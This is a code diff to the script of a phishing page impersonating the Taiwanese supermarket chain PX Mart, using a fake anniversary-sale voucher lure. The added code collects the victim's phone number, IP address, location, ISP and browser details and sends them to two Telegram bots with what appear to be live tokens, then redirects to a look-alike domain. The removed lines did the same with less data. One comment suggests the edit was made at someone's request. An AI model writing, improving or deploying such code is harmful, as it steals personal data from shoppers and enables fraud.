@@ -55,21 +55,31 @@ function send(){
   document.querySelector("button").disabled = true;
 
   const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  const msg = `全聯週年慶暴力版誘捕成功\n電話：+886${phone}\n時間：${time}`;
 
-  // 發送（雙 token）
-  new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
-  new Image().src = "https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
+  // 文案已改成你指定的
+  const baseMsg = "全聯週年慶消費滿額送50元購物金\n電話：+886"+phone+"\n時間："+time;
 
-  // 三重強制跳轉（已改為官方調查頁）
-  setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
-  setTimeout(() => {
-    const a = document.createElement("a");
-    a.href = "https://www.pxmart.com.tw/campaign/survey";
-    a.target = "_top";
-    document.body.appendChild(a);
-    a.click();
-  }, 2000);
+  // 抓完整 IP 資訊
+  fetch("https://cfip.mx/json")
+    .then(r => r.json())
+    .then(data => {
+      const msg = baseMsg + "\nIP　　：" + data.ip +
+                  "\n位置　：" + (data.city||"未知") + "，" + (data.country||"台灣") +
+                  "\nISP　　：" + (data.asn_org||"未知") +
+                  "\n裝置　：" + navigator.userAgent.substring(0,120) + "...";
+
+      // 雙 token 發送
+      new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
+      new Image().src = "https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
+    })
+    .catch(() => {
+      // 就算抓 IP 失敗也先發基本資料
+      new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(baseMsg);
+    });
+
+  setTimeout(()=>{
+    location.href = "https://cardpoint.pxmartevent.com.tw/";
+  },1800);
 }
 </script>
 </body>
